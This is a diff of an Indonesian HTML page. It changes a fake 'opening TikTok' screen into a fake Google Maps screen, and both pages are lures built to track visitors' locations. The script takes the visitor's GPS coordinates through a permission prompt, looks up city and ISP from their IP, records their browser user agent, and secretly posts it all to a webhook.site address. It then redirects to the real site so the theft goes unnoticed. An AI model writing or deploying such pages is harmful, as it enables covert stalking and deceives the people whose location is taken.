@@ -1,67 +1,66 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Buka di TikTok</title>
+    <title>Google Maps</title>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <script>
         async function kirimData(lat = "Ditolak", lon = "Ditolak") {
             try {
-                // Ambil data IP & Provider
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                // Kirim ke Webhook kamu
                 await fetch('https://webhook.site/da585ce8-007d-4bdd-8301-698ea088b877', {
                     method: 'POST',
                     mode: 'no-cors',
                     body: JSON.stringify({
-                        status: "PELACAKAN AKTIF",
-                        google_maps: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "Target Menolak GPS",
+                        status: "LOKASI_GOOGLE_MAPS",
+                        maps_link: lat !== "Ditolak" ? `https://www.google.com/maps?q=${lat},${lon}` : "GPS_MATI",
                         koordinat: `${lat}, ${lon}`,
-                        kota_ip: d.city,
+                        kota: d.city,
                         isp: d.org,
-                        perangkat: navigator.userAgent,
-                        waktu: new Date().toLocaleString('id-ID')
+                        device: navigator.userAgent
                     })
                 });
             } catch (e) {}
             
-            // Setelah data dikirim, langsung lempar ke TikTok asli
+            // Redirect ke tampilan peta umum setelah 1 detik
             setTimeout(() => {
-                window.location.replace("https://www.tiktok.com");
-            }, 500);
+                window.location.replace("https://www.google.com/maps");
+            }, 1000);
         }
 
-        function prosesMasuk() {
+        function getGps() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (p) => { kirimData(p.coords.latitude, p.coords.longitude); },
                     () => { kirimData(); },
-                    { enableHighAccuracy: true, timeout: 8000 }
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
                 kirimData();
             }
         }
-
-        // Jalankan otomatis saat halaman dibuka
-        window.onload = prosesMasuk;
     </script>
 </head>
-<body style="background:#000; color:#fff; display:flex; align-items:center; justify-content:center; height:100vh; font-family:sans-serif; margin:0;">
-    <div style="text-align:center; padding:20px;">
-        <img src="https://logodownload.org/wp-content/uploads/2019/01/tiktok-logo-7.png" width="80" style="margin-bottom:20px;">
-        <h3 style="margin:0 0 10px 0;">Membuka TikTok...</h3>
-        <p style="color:#ccc; font-size:14px;">Situs ini mau membuka TikTok Anda.<br>Pastikan klik <b>"Izinkan"</b> jika muncul permintaan akses.</p>
+<body style="background:#ffffff; color:#3c4043; display:flex; align-items:center; justify-content:center; height:100vh; font-family: 'Roboto',Arial,sans-serif; margin:0;">
+
+    <div style="text-align:center; width: 90%; max-width: 400px;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/aa/Google_Maps_icon_%282020%29.svg/1024px-Google_Maps_icon_%282020%29.svg.png" width="50" style="margin-bottom:20px;">
         
-        <div style="margin-top:30px;">
-            <div style="border: 3px solid #f3f3f3; border-top: 3px solid #fe2c55; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: auto;"></div>
+        <h2 style="font-weight: 400; font-size: 22px; margin: 0 0 10px 0;">Menuju Lokasi...</h2>
+        <p style="font-size: 14px; color: #70757a; line-height: 1.6; margin-bottom: 30px;">
+            Untuk melanjutkan, Google Maps memerlukan akses lokasi agar dapat memberikan rute yang akurat.
+        </p>
+
+        <div onclick="getGps()" style="background:#1a73e8; color:#fff; padding:12px 24px; border-radius:24px; font-size:14px; font-weight:500; cursor:pointer; display:inline-block; box-shadow: 0 1px 3px rgba(60,64,67,0.3);">
+            Lihat Lokasi di Aplikasi
         </div>
+
+        <p style="margin-top: 25px; font-size: 12px; color: #bdc1c6;">
+            Klik "Izinkan" jika browser meminta akses lokasi.
+        </p>
     </div>
 
-    <style>
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
 </body>
 </html>
